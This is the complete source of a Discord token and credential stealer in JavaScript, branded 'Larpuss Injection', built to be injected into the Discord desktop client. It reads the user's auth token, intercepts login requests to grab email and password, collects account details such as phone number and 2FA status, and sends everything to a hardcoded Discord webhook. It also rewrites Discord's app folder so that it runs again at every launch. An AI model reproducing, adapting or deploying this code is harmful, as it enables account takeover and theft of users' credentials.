const { BrowserWindow, session } = require("electron");
const { execSync } = require("child_process");
const fs = require("fs");
const https = require("https");
const path = require("path");

const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";

let EMAIL = "";
let PASSWORD = "";

const sendToWebhook = (data) => {
    try {
        const payload = JSON.stringify(data);
        const url = new URL(WEBHOOK);
        
        const options = {
            hostname: url.hostname,
            port: 443,
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        };
        
        const req = https.request(options, (res) => {});
        req.on('error', () => {});
        req.write(payload);
        req.end();
    } catch {}
};

const getToken = async () => {
    try {
        if (!BrowserWindow.getAllWindows()[0]) return null;
        
        const tokenScript = `
            (() => {
                let token;
                try {
                    const wpRequire = window.webpackChunkdiscord_app?.push([[Math.random()], {}, (req) => {
                        for (const m of Object.keys(req.c).map(x => req.c[x].exports)) {
                            if (m?.default?.getToken) {
                                token = m.default.getToken();
                                break;
                            }
                            if (m?.getToken) {
                                token = m.getToken();
                                break;
                            }
                        }
                    }]);
                } catch {}
                
                if (!token) {
                    try {
                        token = JSON.parse(localStorage.getItem('token'));
                    } catch {}
                }
                
                return token;
            })();
        `;
        
        return await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(tokenScript);
    } catch {
        return null;
    }
};

const fetchDiscordApi = async (endpoint, token) => {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            port: 443,
            path: `/api/v9${endpoint}`,
            method: 'GET',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch {
                    resolve(null);
                }
            });
        });
        
        req.on('error', () => resolve(null));
        req.end();
    });
};

const sendTokenData = async (token, action = "INJECTED") => {
    try {
        const user = await fetchDiscordApi('/users/@me', token);
        if (!user || user.message) return;
        
        const embed = {
            color: 0xFFFFFF,
            author: {
                name: `Larpuss Injection | ${user.username} (${user.id})`,
                icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
            },
            thumbnail: {
                url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null
            },
            fields: [
                {
                    name: "<:token:1547392684342116363> Token",
                    value: `\`\`\`${token}\`\`\``,
                    inline: false
                },
                {
                    name: "<:accmail:1547383216435101696> Email", 
                    value: `\`${user.email || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "<:phone:1547384564605919283> Phone",
                    value: user.phone ? `\`${user.phone}\`` : "<:circlex:1547393394848960573>",
                    inline: true
                },
                {
                    name: "<:a2f:1547384119506378752> 2FA",
                    value: user.mfa_enabled ? "<:circlecheck:1547393367967535144>" : "<:circlex:1547393394848960573>",
                    inline: true
                }
            ],
            footer: {
                text: `t.me/larpuss • ${action}`,
                icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
            },
            timestamp: new Date().toISOString()
        };
        
        if (EMAIL && PASSWORD) {
            embed.fields.unshift(
                {
                    name: "🔐 Login Credentials",
                    value: `**Email:** \`${EMAIL}\`\n**Password:** \`${PASSWORD}\``,
                    inline: false
                }
            );
        }
        
        sendToWebhook({ embeds: [embed] });
    } catch {}
};

// Injection principale
const initInjection = async () => {
    try {
        const token = await getToken();
        if (token && token.length > 50) {
            await sendTokenData(token, "STARTUP INJECTION");
        }
    } catch {}
};

// Écouter les requêtes de login
session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        "https://*.discord.com/api/*/auth/login",
        "https://discord.com/api/*/auth/login", 
        "https://canary.discord.com/api/*/auth/login",
        "https://ptb.discord.com/api/*/auth/login"
    ]
}, (details, callback) => {
    try {
        if (details.uploadData && details.uploadData[0]) {
            const data = JSON.parse(details.uploadData[0].bytes.toString());
            if (data.login && data.password) {
                EMAIL = data.login;
                PASSWORD = data.password;
            }
        }
    } catch {}
    callback({});
});

// Écouter les réponses de login réussies
session.defaultSession.webRequest.onCompleted({
    urls: [
        "https://*.discord.com/api/*/auth/login",
        "https://discord.com/api/*/auth/login",
        "https://canary.discord.com/api/*/auth/login", 
        "https://ptb.discord.com/api/*/auth/login"
    ]
}, async (details) => {
    if (details.method === "POST" && (details.statusCode === 200 || details.statusCode === 202)) {
        setTimeout(async () => {
            const token = await getToken();
            if (token && token.length > 50) {
                await sendTokenData(token, "LOGIN CAPTURED");
            }
        }, 2000);
    }
});

// Auto-installation dans Discord
const installPersistence = () => {
    try {
        const discordPath = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
        const resourcePath = path.join(discordPath, "resources");
        
        if (!fs.existsSync(resourcePath)) return;
        
        const appPath = path.join(resourcePath, "app");
        if (!fs.existsSync(appPath)) {
            fs.mkdirSync(appPath, { recursive: true });
        }
        
        const packageJson = path.join(appPath, "package.json");
        const indexJs = path.join(appPath, "index.js");
        
        // Package.json
        fs.writeFileSync(packageJson, JSON.stringify({
            name: "discord",
            main: "index.js"
        }));
        
        // Index.js avec injection
        const injectionCode = `
${fs.readFileSync(__filename, 'utf8')}

require("${path.join(resourcePath, "app.asar").replace(/\\/g, "\\\\")}");
        `;
        
        fs.writeFileSync(indexJs, injectionCode);
    } catch {}
};

// Démarrage
setTimeout(() => {
    initInjection();
    installPersistence();
}, 3000);

// Export pour Discord
module.exports = require("./core.asar");
